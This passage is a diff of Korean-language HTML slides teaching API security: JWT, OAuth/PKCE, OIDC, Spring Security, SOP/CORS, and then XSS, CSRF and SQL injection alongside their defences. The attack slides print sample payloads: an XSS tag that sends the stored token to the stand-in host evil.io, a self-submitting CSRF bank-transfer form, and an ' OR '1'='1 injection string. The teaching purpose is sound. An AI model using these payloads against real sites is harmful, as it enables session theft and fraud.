+        <text class="dg-label--flow" x="700" y="297" text-anchor="middle">서명 대상: Header.Payload</text>
+      </svg>
+    </figure>
+    <div class="prose">
+      <p><dfn title="JSON Web Token, RFC 7519">JWT</dfn>의 각 조각은 JSON을 Base64url로 인코딩한 것입니다. Payload에는 <code>sub</code>(주체), <code>exp</code>(만료), <code>iss</code>(발급자), <code>aud</code>(대상) 같은 <dfn>클레임</dfn>이 들어갑니다.</p>
+    </div>
+  </div>
+</section>
+
+<section class="slide">
+  <h2>서명이 있으니 서버는 저장소를 보지 않는다</h2>
+  <div class="split split--even">
+    <ol class="steps">
+      <li><b>발급</b><p>로그인 성공 시 서버가 Header와 Payload를 만들고 서명을 붙입니다.</p></li>
+      <li><b>전송</b><p>클라이언트는 매 요청에 <code>Authorization: Bearer 토큰</code>을 싣습니다.</p></li>
+      <li class="is-key"><b>서명 검증</b><p>받은 Header.Payload로 서명을 다시 계산해 일치하는지 봅니다.</p></li>
+      <li><b>클레임 검증</b><p><code>exp</code>, <code>iss</code>, <code>aud</code>를 확인하고 <code>sub</code>를 사용자로 씁니다.</p></li>
+    </ol>
+    <div class="prose">
+      <p>Payload의 <code>role</code>을 <code>ADMIN</code>으로 바꾸면 서명이 맞지 않게 됩니다. 서명을 새로 만들려면 서버의 키가 필요하므로 위조할 수 없습니다.</p>
+      <p>이것이 <mark>DB나 세션 저장소를 조회하지 않고도 요청을 믿을 수 있는 이유</mark>입니다. 동시에, 서버가 아무것도 기억하지 않으므로 발급한 토큰을 도중에 취소하기 어렵다는 약점도 여기서 나옵니다.</p>
+    </div>
+  </div>
+</section>
+
+<section class="slide">
+  <h2>HS256은 키 공유, RS256은 공개키 배포</h2>
+  <div class="split split--center">
+    <div class="prose">
+      <p><dfn>HS256</dfn>은 HMAC-SHA256, 즉 대칭키 MAC입니다. 검증하는 모든 서버가 발급 키를 가져야 하므로, <mark>검증만 하면 되는 서버도 토큰을 위조할 수 있습니다</mark>. 키는 256비트 이상이어야 합니다(RFC 7518).</p>
+      <p><dfn>RS256</dfn>(또는 ES256)은 개인키로 서명하고 공개키로 검증합니다. 공개키는 <code>/.well-known/jwks.json</code> 같은 <dfn title="JSON Web Key Set">JWKS</dfn>로 배포하고, Header의 <code>kid</code>로 어떤 키인지 고릅니다. 서비스가 여럿이면 RS256이 기본입니다.</p>
+    </div>
+    <figure class="figure">
+      <svg class="dg" viewBox="0 0 760 520" role="img" aria-labelledby="f-hsrs-t">
+        <title id="f-hsrs-t">HS256은 인증 서버와 모든 API 서버가 같은 비밀키를 가지고, RS256은 인증 서버만 개인키를 가지며 API 서버는 JWKS에서 공개키를 받아 검증한다.</title>
+        <rect class="dg-zone" x="10" y="20" width="740" height="230"/>
+        <text class="dg-label--sm" x="30" y="44" text-anchor="start">HS256</text>
+        <rect class="dg-box" x="40" y="114" width="200" height="64"/>
+        <text x="140" y="138" text-anchor="middle">인증 서버</text>
+        <text class="dg-label--sm dg-label--key" x="140" y="162" text-anchor="middle">secret으로 서명</text>
+        <rect class="dg-box" x="500" y="50" width="220" height="56"/><text x="610" y="70" text-anchor="middle">API 서버 A</text><text class="dg-label--sm dg-label--key" x="610" y="92" text-anchor="middle">secret 보유</text>
+        <rect class="dg-box" x="500" y="118" width="220" height="56"/><text x="610" y="138" text-anchor="middle">API 서버 B</text><text class="dg-label--sm dg-label--key" x="610" y="160" text-anchor="middle">secret 보유</text>
+        <rect class="dg-box" x="500" y="186" width="220" height="56"/><text x="610" y="206" text-anchor="middle">API 서버 C</text><text class="dg-label--sm dg-label--key" x="610" y="228" text-anchor="middle">secret 보유</text>
+        <path class="dg-arrow dg-arrow--key" d="M248,140 Q370,78 492,78"/>
+        <path class="dg-arrow dg-arrow--key" d="M248,146 H492"/>
+        <path class="dg-arrow dg-arrow--key" d="M248,152 Q370,214 492,214"/>
+        <rect class="dg-zone" x="10" y="270" width="740" height="230"/>
+        <text class="dg-label--sm" x="30" y="294" text-anchor="start">RS256</text>
+        <rect class="dg-box dg-box--solid" x="30" y="364" width="190" height="64"/>
+        <text class="dg-label--on" x="125" y="388" text-anchor="middle">인증 서버</text>
+        <text class="dg-label--sm dg-label--on" x="125" y="412" text-anchor="middle">개인키로 서명</text>
+        <rect class="dg-box dg-box--ghost" x="268" y="364" width="170" height="64"/>
+        <text x="353" y="388" text-anchor="middle">JWKS</text>
+        <text class="dg-label--sm" x="353" y="412" text-anchor="middle">공개키 목록</text>
+        <rect class="dg-box dg-box--flow" x="500" y="300" width="220" height="56"/><text x="610" y="320" text-anchor="middle">API 서버 A</text><text class="dg-label--sm" x="610" y="342" text-anchor="middle">공개키로 검증</text>
+        <rect class="dg-box dg-box--flow" x="500" y="368" width="220" height="56"/><text x="610" y="388" text-anchor="middle">API 서버 B</text><text class="dg-label--sm" x="610" y="410" text-anchor="middle">공개키로 검증</text>
+        <rect class="dg-box dg-box--flow" x="500" y="436" width="220" height="56"/><text x="610" y="456" text-anchor="middle">API 서버 C</text><text class="dg-label--sm" x="610" y="478" text-anchor="middle">공개키로 검증</text>
+        <path class="dg-arrow dg-arrow--flow" d="M224,396 H260"/>
+        <path class="dg-arrow dg-arrow--back" d="M492,328 Q466,328 446,380"/>
+        <path class="dg-arrow dg-arrow--back" d="M492,396 H446"/>
+        <path class="dg-arrow dg-arrow--back" d="M492,464 Q466,464 446,412"/>
+      </svg>
+      <figcaption>HS256에서는 키를 가진 모든 서버가 발급자가 될 수 있습니다. RS256에서는 발급 능력이 인증 서버 한 곳에만 남습니다.</figcaption>
+    </figure>
+  </div>
+</section>
+
+<section class="slide">
+  <h2>Payload는 암호화가 아니라 인코딩이다</h2>
+  <div class="split split--wide-left">
+    <pre class="code" data-file="터미널"><code><span class="prompt">$ </span>echo <span class="s">'eyJzdWIiOiI0MiIsInJvbGUiOiJVU0VSIn0'</span> \
+    | base64 -d
+<span class="hl">{"sub":"42","role":"USER"}</span>
+
+<span class="c"># 검증 라이브러리 설정에서 막아야 할 것</span>
+{"alg":<span class="s">"none"</span>}         <span class="c"># 서명 없는 토큰</span>
+{"alg":<span class="s">"HS256"</span>} + 공개키  <span class="c"># 알고리즘 혼동</span></code></pre>
+    <div class="prose">
+      <p>Base64url은 누구나 되돌릴 수 있는 표기법일 뿐입니다. 서명은 <strong>변조를 막을 뿐 내용을 숨기지 않으므로</strong>, 주민번호나 이메일 같은 민감 정보를 Payload에 넣으면 안 됩니다. 숨겨야 한다면 JWE(암호화된 JWT)를 따로 씁니다.</p>
+      <p>검증 쪽은 Header의 <code>alg</code>를 믿지 말고, 허용할 알고리즘을 서버 설정으로 고정해야 합니다(RFC 8725).</p>
+    </div>
+  </div>
+</section>
+
+<section class="slide">
+  <h2>Access는 짧게, Refresh는 길게 나눈다</h2>
+  <div class="split split--even">
+    <div class="prose">
+      <p>JWT는 도중에 취소하기 어렵습니다. 그렇다면 탈취돼도 피해가 작도록 <strong>수명을 짧게</strong> 하면 됩니다. 하지만 15분마다 다시 로그인하라고 할 수는 없습니다.</p>
+      <p>그래서 토큰을 둘로 나눕니다. <dfn>Access Token</dfn>은 API 호출에 쓰는 짧은 토큰(수 분~1시간)이고, <dfn>Refresh Token</dfn>은 새 Access Token을 받는 데만 쓰는 긴 토큰(수일~수주)입니다.</p>
+    </div>
+    <table class="compare">
+      <thead><tr><th scope="col">항목</th><th scope="col">Access</th><th scope="col">Refresh</th></tr></thead>
+      <tbody>
+        <tr><th scope="row">보내는 곳</th><td>모든 API</td><td>재발급 엔드포인트만</td></tr>
+        <tr><th scope="row">서버 검증</th><td>서명만(무상태)</td><td class="is-flow">저장소 조회(상태)</td></tr>
+        <tr><th scope="row">노출 빈도</th><td>높음</td><td>낮음</td></tr>
+        <tr><th scope="row">탈취 시 피해</th><td>만료까지 짧게</td><td class="is-key">계속 재발급 가능</td></tr>
+      </tbody>
+      <caption>Refresh Token은 서버에 기록해 두어야 취소할 수 있습니다. 결국 상태가 일부 돌아옵니다.</caption>
+    </table>
+  </div>
+</section>
+
+<section class="slide">
+  <h2>Rotation은 재사용을 탈취의 신호로 본다</h2>
+  <div class="split split--even">
+    <ol class="steps">
+      <li><b>로그인</b><p>서버가 RT1을 발급하고 토큰 계열(family)로 기록합니다.</p></li>
+      <li><b>정상 재발급</b><p>RT1을 내면 새 Access와 RT2를 주고, RT1은 사용됨으로 표시합니다.</p></li>
+      <li class="is-key"><b>재사용 감지</b><p>누군가 이미 쓴 RT1을 다시 내면 탈취로 보고 계열 전체를 폐기합니다.</p></li>
+      <li><b>재로그인</b><p>공격자도, 정상 사용자도 RT2가 막혀 다시 로그인해야 합니다.</p></li>
+    </ol>
+    <div class="prose">
+      <p><dfn title="Refresh Token Rotation">Rotation</dfn>은 Refresh Token을 쓸 때마다 새것으로 바꿔 주는 방식입니다. 정상 클라이언트는 항상 최신 토큰만 쓰므로, <mark>옛 토큰이 다시 나타났다면 누군가 복사해 갔다는 뜻</mark>입니다.</p>
+      <p>OAuth 보안 모범 사례(RFC 9700)는 공개 클라이언트의 Refresh Token에 Rotation이나 송신자 제한을 요구합니다.</p>
+    </div>
+  </div>
+</section>
+
+<section class="slide">
+  <h2>로그아웃은 무상태에 상태를 조금 더하는 일이다</h2>
+  <div class="split split--wide-left">
+    <pre class="code" data-file="로그아웃 처리"><code><span class="c">// 1. Refresh Token 폐기 (저장소에서 삭제)</span>
+refreshTokenRepository.deleteByFamily(familyId);
+
+<span class="c">// 2. 남은 Access Token은 jti를 블랙리스트에</span>
+<span class="k">long</span> ttl = claims.getExpiration().getTime()
+         - System.currentTimeMillis();
+<span class="hl">redis.set(<span class="s">"bl:"</span> + claims.getId(), <span class="s">"1"</span>, ttl);</span>
+
+<span class="c">// 3. 인증 필터에서 매 요청 확인</span>
+<span class="k">if</span> (redis.exists(<span class="s">"bl:"</span> + jti)) <span class="k">throw</span> ...;</code></pre>
+    <div class="prose">
+      <p>클라이언트가 토큰을 지워도 복사본은 만료까지 유효합니다. 즉시 막으려면 서버가 "이 토큰은 무효"라고 기억해야 합니다.</p>
+      <p>블랙리스트는 토큰의 남은 수명만큼만 보관하면 되므로 Redis TTL과 잘 맞습니다. 매 요청 조회가 생기지만, 전체 세션이 아니라 <strong>로그아웃한 토큰만</strong> 담기 때문에 작게 유지됩니다.</p>
+    </div>
+  </div>
+</section>
+
+<section class="slide">
+  <h2>OAuth 2.0은 비밀번호 대신 권한을 위임한다</h2>
+  <div class="split split--even">
+    <div class="prose">
+      <p>사진 인화 서비스가 내 구글 포토에 접근하려 할 때, 구글 비밀번호를 그 서비스에 알려 주는 것은 위험합니다. 모든 권한을 넘기게 되고 취소하려면 비밀번호를 바꿔야 합니다.</p>
+      <p><dfn title="RFC 6749">OAuth 2.0</dfn>은 사용자가 구글에서 직접 동의하고, 서비스는 <mark>범위(scope)와 기한이 정해진 Access Token</mark>만 받게 하는 <strong>인가 위임</strong> 프로토콜입니다.</p>
+    </div>
+    <table class="compare">
+      <thead><tr><th scope="col">역할</th><th scope="col">예시</th></tr></thead>
+      <tbody>
+        <tr><th scope="row">Resource Owner</th><td>사진의 주인인 사용자</td></tr>
+        <tr><th scope="row">Client</th><td>사진 인화 서비스</td></tr>
+        <tr><th scope="row">Authorization Server</th><td>구글 로그인과 동의 화면</td></tr>
+        <tr><th scope="row">Resource Server</th><td>구글 포토 API</td></tr>
+      </tbody>
+    </table>
+  </div>
+</section>
+
+<section class="slide">
+  <h2>Code 흐름은 토큰을 백 채널로 숨긴다</h2>
+  <div class="slide__body">
+    <figure class="figure">
+      <svg class="dg" viewBox="0 0 1400 560" role="img" aria-labelledby="f-oauth-t">
+        <title id="f-oauth-t">Authorization Code와 PKCE 흐름. 브라우저는 인가 서버에서 로그인하고 code만 받아 클라이언트에 전달하며, 클라이언트는 code와 code_verifier를 인가 서버에 직접 보내 토큰을 받은 뒤 리소스 서버를 호출한다.</title>
+        <rect class="dg-box" x="70" y="8" width="220" height="56"/><text x="180" y="36" text-anchor="middle">사용자 브라우저</text>
+        <rect class="dg-box dg-box--flow" x="410" y="8" width="220" height="56"/><text x="520" y="36" text-anchor="middle">클라이언트(백엔드)</text>
+        <rect class="dg-box" x="770" y="8" width="220" height="56"/><text x="880" y="36" text-anchor="middle">인가 서버</text>
+        <rect class="dg-box" x="1110" y="8" width="220" height="56"/><text x="1220" y="36" text-anchor="middle">리소스 서버</text>
+        <line class="dg-lane" x1="180" y1="64" x2="180" y2="550"/>
+        <line class="dg-lane" x1="520" y1="64" x2="520" y2="550"/>
+        <line class="dg-lane" x1="880" y1="64" x2="880" y2="550"/>
+        <line class="dg-lane" x1="1220" y1="64" x2="1220" y2="550"/>
+        <!-- 1 -->
+        <path class="dg-arrow dg-arrow--flow" d="M188,100 H512"/>
+        <text class="dg-label--sm" x="350" y="90" text-anchor="middle">"구글로 로그인" 클릭</text>
+        <!-- 2 -->
+        <path class="dg-arrow dg-arrow--flow dg-arrow--back" d="M512,146 H188"/>
+        <text class="dg-label--sm" x="350" y="136" text-anchor="middle">302 인가 서버로 (code_challenge, state)</text>
+        <!-- 3 -->
+        <path class="dg-arrow dg-arrow--flow" d="M188,192 H872"/>
+        <rect class="dg-fill-paper" x="560" y="168" width="260" height="20"/>
+        <text class="dg-label--sm" x="690" y="182" text-anchor="middle">GET /authorize?scope=openid ...</text>
+        <!-- 4 -->
+        <rect class="dg-box dg-box--muted" x="770" y="212" width="220" height="44"/>
+        <text class="dg-label--sm" x="880" y="234" text-anchor="middle">사용자 로그인과 동의</text>
+        <!-- 5 -->
+        <path class="dg-arrow dg-arrow--flow dg-arrow--back" d="M872,284 H188"/>
+        <rect class="dg-fill-paper" x="540" y="260" width="300" height="20"/>
+        <text class="dg-label--sm" x="690" y="274" text-anchor="middle">302 redirect_uri?code=…&amp;state=…</text>
+        <!-- 6 -->
+        <path class="dg-arrow dg-arrow--flow" d="M188,330 H512"/>
+        <text class="dg-label--sm" x="350" y="320" text-anchor="middle">code 전달 (일회용, 수명 짧음)</text>
+        <!-- 7 -->
+        <path class="dg-arrow dg-arrow--key" d="M528,376 H872"/>
+        <text class="dg-label--key" x="700" y="366" text-anchor="middle">POST /token (code, code_verifier)</text>
+        <!-- 8 -->
+        <path class="dg-arrow dg-arrow--back" d="M872,430 H528"/>
+        <text class="dg-label--sm" x="700" y="408" text-anchor="middle">SHA-256(verifier) = challenge 확인 후</text>
+        <text class="dg-label--sm" x="700" y="452" text-anchor="middle">Access, Refresh, ID Token 발급</text>
+        <!-- 9 -->
+        <path class="dg-arrow dg-arrow--flow" d="M528,496 H1212"/>
+        <text class="dg-label--sm" x="1040" y="486" text-anchor="middle">Authorization: Bearer (Access Token)</text>
+        <!-- 10 -->
+        <path class="dg-arrow dg-arrow--back" d="M1212,536 H528"/>
+        <text class="dg-label--sm" x="1040" y="528" text-anchor="middle">사진 목록</text>
+        <!-- channel labels -->
+        <text class="dg-label--muted" x="40" y="215" text-anchor="start">프론트 채널</text>
+        <text class="dg-label--muted" x="40" y="430" text-anchor="start">백 채널</text>
+      </svg>
+    </figure>
+    <p class="small">브라우저 주소창을 거치는 프론트 채널에는 일회용 code만 지나가고, 토큰은 클라이언트와 인가 서버가 직접 통신하는 백 채널에서만 오갑니다.</p>
+  </div>
+</section>
+
+<section class="slide">
+  <h2>PKCE는 code를 훔쳐도 쓸 수 없게 만든다</h2>
+  <div class="split split--even">
+    <div class="prose">
+      <p>모바일 앱이나 SPA처럼 비밀을 숨길 수 없는 <strong>공개 클라이언트</strong>는 client_secret이 없습니다. 이때 리다이렉트 중에 code가 가로채지면 공격자가 그대로 토큰으로 바꿀 수 있습니다.</p>
+      <p><dfn title="Proof Key for Code Exchange, RFC 7636">PKCE</dfn>는 클라이언트가 매번 무작위 <code>code_verifier</code>(43~128자)를 만들고, 그 SHA-256 해시인 <code>code_challenge</code>만 먼저 보냅니다. 토큰 교환 때 원본 verifier를 내야 하므로 <mark>code만 훔친 공격자는 토큰을 받을 수 없습니다</mark>.</p>
+    </div>
+    <div class="slide__body">
+      <div class="prose">
+        <p>3부의 해시가 여기서 쓰입니다. 해시는 되돌릴 수 없으니 challenge가 노출돼도 verifier를 알아낼 수 없습니다.</p>
+      </div>
+      <aside class="callout callout--note">
+        <p class="callout__title"><svg viewBox="0 0 24 24" aria-hidden="true"><circle cx="12" cy="12" r="9"/><path d="M12 11v5M12 7.5v.01"/></svg>지금의 기본값</p>
+        <p>RFC 9700은 공개 클라이언트에 PKCE를 필수로, 기밀 클라이언트에도 권장합니다. 토큰을 주소창으로 바로 주던 Implicit 흐름은 쓰지 말라고 합니다.</p>
+      </aside>
+    </div>
+  </div>
+</section>
+
+<section class="slide">
+  <h2>OIDC는 OAuth 위에 "누구인지"를 얹는다</h2>
+  <div class="split split--even">
+    <div class="prose">
+      <p>OAuth의 Access Token은 "이 API를 호출해도 된다"는 인가 증표일 뿐, 사용자가 누구인지 알려 주는 표준 형식이 없습니다. 그런데 "구글로 로그인"은 정확히 그것, 즉 <strong>인증</strong>이 필요합니다.</p>
+      <p><dfn title="OpenID Connect">OIDC</dfn>는 scope에 <code>openid</code>를 넣으면 토큰 응답에 <dfn>ID Token</dfn>을 함께 주도록 OAuth를 확장합니다. ID Token은 JWT이므로 앞에서 본 서명 검증을 그대로 씁니다.</p>
+    </div>
+    <table class="compare">
+      <thead><tr><th scope="col">항목</th><th scope="col">Access Token</th><th scope="col">ID Token</th></tr></thead>
+      <tbody>
+        <tr><th scope="row">목적</th><td>API 호출 권한</td><td class="is-flow">로그인한 사용자 증명</td></tr>
+        <tr><th scope="row">받는 쪽</th><td>리소스 서버</td><td>클라이언트</td></tr>
+        <tr><th scope="row">형식</th><td>규정 없음(불투명 가능)</td><td>항상 JWT</td></tr>
+        <tr><th scope="row">핵심 클레임</th><td>scope</td><td>sub, aud, nonce</td></tr>
+      </tbody>
+      <caption>ID Token을 API 호출에 쓰면 안 됩니다. aud가 클라이언트로 되어 있습니다.</caption>
+    </table>
+  </div>
+</section>
+
+<section class="slide">
+  <h2>Spring Security는 필터 체인이다</h2>
+  <div class="slide__body">
+    <ol class="flow">
+      <li class="flow__node"><b>서블릿 필터</b><span>DelegatingFilterProxy</span></li>
+      <li class="flow__node is-flow"><b>FilterChainProxy</b><span>URL별 체인 선택</span></li>
+      <li class="flow__node"><b>인증 필터</b><span>토큰 검증, 사용자 설정</span></li>
+      <li class="flow__node is-key"><b>AuthorizationFilter</b><span>권한 확인, 거절</span></li>
+      <li class="flow__node"><b>DispatcherServlet</b><span>컨트롤러 호출</span></li>
+    </ol>
+    <div class="split split--even">
+      <div class="prose">
+        <p>6장에서 본 서블릿 필터 위에서 동작합니다. 컨테이너에 등록된 필터 하나가 Spring Bean인 <code>FilterChainProxy</code>에 위임하고, 그 안의 <code>SecurityFilterChain</code>이 CORS, CSRF, 인증, 인가 필터를 순서대로 실행합니다.</p>
+      </div>
+      <div class="prose">
+        <p>인증 결과는 <code>SecurityContextHolder</code>에 담기며 기본 저장 방식은 ThreadLocal(5장)입니다. 인증 실패는 401, 인가 실패는 403으로 <code>ExceptionTranslationFilter</code>가 바꿔 줍니다.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 5부 원리: 브라우저 경계와 공격 ================================ -->
+<section class="slide slide--divider" data-section="브라우저 보안과 공격" data-depth="core">
+  <p class="divider__no">5부</p>
+  <h2>브라우저는 경계를 긋고, 공격은 그 틈을 노린다</h2>
+  <p class="lede">API를 호출하는 주체가 브라우저라면 사정이 달라집니다. 브라우저는 쿠키를 자동으로 보내고 남의 스크립트도 실행합니다. 그래서 생긴 경계 규칙과, 그 규칙을 우회하는 대표 공격 세 가지를 봅니다.</p>
+</section>
+
+<section class="slide">
+  <h2>SOP: 출처가 다르면 응답을 읽지 못한다</h2>
+  <div class="split split--even">
+    <div class="prose">
+      <p><dfn title="Same-Origin Policy">동일 출처 정책(SOP)</dfn>은 한 출처의 스크립트가 다른 출처의 응답을 읽지 못하게 하는 브라우저 규칙입니다. <dfn title="origin">출처</dfn>는 스킴, 호스트, 포트 세 가지가 모두 같아야 같습니다.</p>
+      <p>이 규칙이 없으면 악성 사이트의 스크립트가 내 쿠키가 실린 채로 은행 API를 호출하고 <mark>응답 내용까지 읽어 갈 수 있습니다</mark>.</p>
+    </div>
+    <table class="compare">
+      <thead><tr><th scope="col">https://shop.com 기준</th><th scope="col">결과</th></tr></thead>
+      <tbody>
+        <tr><th scope="row">https://shop.com/api</th><td class="is-flow">같은 출처</td></tr>
+        <tr><th scope="row">http://shop.com</th><td>다름(스킴)</td></tr>
+        <tr><th scope="row">https://api.shop.com</th><td>다름(호스트)</td></tr>
+        <tr><th scope="row">https://shop.com:8443</th><td>다름(포트)</td></tr>
+      </tbody>
+      <caption>SOP는 요청 전송이 아니라 응답 읽기를 막습니다. 폼 전송, 이미지 로드는 원래 다른 출처로도 됩니다.</caption>
+    </table>
+  </div>
+</section>
+
+<section class="slide">
+  <h2>CORS는 서버가 허락한 출처에만 문을 연다</h2>
+  <div class="split split--wide-left">
+    <div class="seq" role="img" aria-label="브라우저가 OPTIONS로 사전 요청을 보내 허용 여부를 묻고, 서버가 허용 헤더로 답하면 실제 요청을 보내고 응답을 스크립트에 전달한다">
+      <div class="seq__head"><span>브라우저</span><span></span><span>api.shop.com</span></div>
+      <div class="seq__row seq__row--r">
+        <span class="seq__state">사전 요청</span>
+        <span class="seq__msg"><b>OPTIONS /orders</b> Origin: https://shop.com<small>Access-Control-Request-Method: POST</small></span>
+        <span class="seq__state"></span>
+      </div>
+      <div class="seq__row seq__row--l is-back">
+        <span class="seq__state"></span>
+        <span class="seq__msg"><b>204</b> Allow-Origin: https://shop.com<small>Allow-Methods, Allow-Headers, Max-Age</small></span>
+        <span class="seq__state"></span>
+      </div>
+      <div class="seq__row seq__row--r">
+        <span class="seq__state">실제 요청</span>
+        <span class="seq__msg"><b>POST /orders</b> Content-Type: JSON</span>
+        <span class="seq__state"></span>
+      </div>
+      <div class="seq__row seq__row--l is-back is-key">
+        <span class="seq__state is-key">읽기 허용</span>
+        <span class="seq__msg"><b>201</b> Allow-Origin: https://shop.com</span>
+        <span class="seq__state"></span>
+      </div>
+    </div>
+    <div class="prose">
+      <p><dfn title="Cross-Origin Resource Sharing">CORS</dfn>는 SOP에 예외를 여는 표준입니다. 서버가 응답 헤더로 허용 출처를 밝히면 브라우저가 스크립트에 응답을 넘겨 줍니다.</p>
+      <p><code>application/json</code> 본문이나 <code>Authorization</code> 헤더처럼 단순 요청 범위를 넘으면, 브라우저가 먼저 <dfn title="preflight">사전 요청</dfn>으로 허락을 묻습니다.</p>
+    </div>
+  </div>
+</section>
+
+<section class="slide">
+  <h2>CORS는 브라우저가 지키는 규칙이다</h2>
+  <div class="split split--even">
+    <div class="prose">
+      <p>메서드가 <code>GET</code>, <code>HEAD</code>, <code>POST</code>이고 Content-Type이 폼이나 <code>text/plain</code>인 <strong>단순 요청</strong>은 사전 요청 없이 바로 전송됩니다. 서버는 이미 처리를 끝냈고, 브라우저는 응답을 스크립트에 넘길지만 결정합니다.</p>
+      <p>또 curl이나 서버 간 호출에는 CORS가 아예 없습니다. 그러니 <mark>CORS는 API 보호 수단이 아닙니다</mark>. 인증과 인가는 서버가 따로 해야 합니다.</p>
+    </div>
+    <div class="slide__body">
+      <aside class="callout callout--key">
+        <p class="callout__title"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 4l9 16H3z"/><path d="M12 10v4M12 17.5v.01"/></svg>쿠키를 보낼 때는 와일드카드 금지</p>
+        <p>credentials 요청에는 <code>Allow-Origin: *</code>가 허용되지 않습니다. 정확한 출처와 <code>Allow-Credentials: true</code>를 함께 줘야 합니다.</p>
+      </aside>
+      <div class="prose">
+        <p class="small"><code>Access-Control-Max-Age</code>로 사전 요청 결과를 캐시할 수 있지만 브라우저가 상한을 둡니다(Chromium 2시간, Firefox 24시간).</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="slide">
+  <h2>XSS: 남의 스크립트가 내 페이지에서 돈다</h2>
+  <div class="split split--wide-left">
+    <pre class="code" data-file="저장형 XSS"><code><span class="c">&lt;!-- 게시글 본문에 저장된 입력 --&gt;</span>
+<span class="hl">&lt;img src=x onerror="fetch('//evil.io?c='+</span>
+<span class="hl">  localStorage.getItem('token'))"&gt;</span>
+
+<span class="c">&lt;!-- 출력 시 HTML 이스케이프하면 --&gt;</span>
+&amp;lt;img src=x onerror=...&amp;gt;  <span class="c">글자로만 보임</span>
+
+<span class="c"># 추가 방어: 응답 헤더</span>
+Content-Security-Policy: script-src <span class="s">'self'</span></code></pre>
+    <div class="prose">
+      <p><dfn title="Cross-Site Scripting">XSS</dfn>는 공격자의 입력이 HTML로 해석되어 피해자의 브라우저에서 실행되는 공격입니다. 같은 출처에서 도는 코드이므로 SOP가 막아 주지 않고, <code>localStorage</code>의 토큰도 읽힙니다.</p>
+      <p>방어의 중심은 <strong>출력 위치에 맞는 이스케이프</strong>입니다. 여기에 CSP로 허용 스크립트를 제한하고, 쿠키에 <code>HttpOnly</code>를 붙여 스크립트 접근을 막습니다.</p>
+    </div>
+  </div>
+</section>
+
+<section class="slide">
+  <h2>CSRF: 자동으로 붙는 쿠키를 악용한다</h2>
+  <div class="split split--wide-left">
+    <pre class="code" data-file="evil.io 페이지"><code><span class="c">&lt;!-- 피해자가 bank.com에 로그인된 상태 --&gt;</span>
+&lt;form action=<span class="s">"https://bank.com/transfer"</span>
+      method=<span class="s">"POST"</span>&gt;
+  &lt;input name=<span class="s">"to"</span> value=<span class="s">"attacker"</span>&gt;
+  &lt;input name=<span class="s">"amount"</span> value=<span class="s">"1000000"</span>&gt;
+&lt;/form&gt;
+<span class="hl">&lt;script&gt;document.forms[0].submit()&lt;/script&gt;</span></code></pre>
+    <div class="prose">
+      <p><dfn title="Cross-Site Request Forgery">CSRF</dfn>는 공격자가 응답을 읽지 않아도 됩니다. 요청만 보내면 브라우저가 bank.com 세션 쿠키를 자동으로 실어 주고, 서버는 정상 요청으로 처리합니다.</p>
+      <p>방어는 <strong>공격 페이지가 알 수 없는 값</strong>을 요구하는 것입니다. 폼마다 CSRF 토큰을 넣거나, 쿠키에 <code>SameSite=Lax</code> 이상을 줘서 교차 사이트 POST에 쿠키가 붙지 않게 하고, <code>Origin</code> 헤더를 확인합니다.</p>
+    </div>
+  </div>
+</section>
+
+<section class="slide">
+  <h2>SQL Injection: 데이터가 코드가 된다</h2>
+  <div class="split split--wide-left">
+    <pre class="code" data-file="Java"><code><span class="c">// 위험: 입력이 SQL 문법의 일부가 됨</span>
+String sql = <span class="s">"SELECT * FROM users WHERE name='"</span>
+           + name + <span class="s">"'"</span>;
+<span class="hl"><span class="c">// name = ' OR '1'='1  → 전체 행 반환</span></span>
+
+<span class="c">// 안전: 구조를 먼저 고정하고 값만 바인딩</span>
+PreparedStatement ps = conn.prepareStatement(
+    <span class="s">"SELECT * FROM users WHERE name = ?"</span>);
+ps.setString(<span class="n">1</span>, name);
+
+<span class="c">// MyBatis: #{name}은 바인딩, ${name}은 치환</span></code></pre>
+    <div class="prose">
+      <p>문자열을 이어 붙이면 DB는 어디까지가 값이고 어디부터가 명령인지 구분하지 못합니다. <code>PreparedStatement</code>는 SQL 구조를 먼저 파싱해 두고 값을 나중에 넣으므로 <mark>입력이 문법으로 해석될 여지가 없습니다</mark>.</p>
+      <p>JPA도 JPQL을 문자열로 이어 붙이면 똑같이 뚫립니다. <code>ORDER BY</code> 컬럼명처럼 바인딩할 수 없는 곳은 허용 목록으로 검사합니다.</p>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 6부 실무 ===================================================== -->
+<section class="slide slide--divider" data-section="운영에서의 API 보안" data-depth="practice">
+  <p class="divider__no">6부</p>
+  <h2>운영에서 마주치는 선택과 사고</h2>
+  <p class="lede">원리를 알아도 운영에서는 "어디에 저장할까", "털리면 무엇부터 할까", "왜 프론트에서만 막히지?" 같은 질문이 남습니다. API 변경 관리부터 앞단 구성까지 실제 판단 기준을 정리합니다.</p>
+  <div class="depth-shift" aria-label="깊이 전환: 원리에서 실무로">
+    <span class="depth-shift__step"><span class="depth" data-depth="core"><span class="depth__ticks" aria-hidden="true"><i></i><i></i><i></i></span></span>원리</span>
+    <span class="depth-shift__line" aria-hidden="true"></span>
+    <span class="depth-shift__step is-to"><span class="depth" data-depth="practice"><span class="depth__ticks" aria-hidden="true"><i></i><i></i><i></i></span></span>실무</span>
+    <span class="depth-shift__note">버저닝 정책, 쿠키 설정값, 사고 대응 순서, 흔한 설정 실수를 다룹니다.</span>
+  </div>
+</section>
+
+<section class="slide">
+  <h2>버전은 깨는 변경이 생길 때만 올린다</h2>
+  <div class="slide__body">
+    <table class="compare">
+      <thead><tr><th scope="col">방식</th><th scope="col">예</th><th scope="col">장점</th><th scope="col">단점</th></tr></thead>
+      <tbody>
+        <tr><th scope="row">URI 경로</th><td><code>/v1/orders</code></td><td class="is-flow">눈에 보이고 라우팅 쉬움</td><td>리소스 주소가 바뀜</td></tr>
+        <tr><th scope="row">커스텀 헤더</th><td><code>Api-Version: 2</code></td><td>URI 유지</td><td>테스트, 캐시 설정이 번거로움</td></tr>
+        <tr><th scope="row">미디어 타입</th><td><code>Accept: …v2+json</code></td><td>HTTP 의미에 가장 충실</td><td>도구 지원이 약함</td></tr>
+      </tbody>
+    </table>
+    <div class="split split--even">
+      <div class="prose">
+        <p>선택 필드 추가, 새 엔드포인트 추가는 <strong>하위 호환</strong>이므로 버전을 올리지 않습니다. 필드 삭제나 이름 변경, 타입 변경, 선택을 필수로 바꾸는 것이 깨는 변경입니다.</p>
+      </div>
+      <div class="prose">
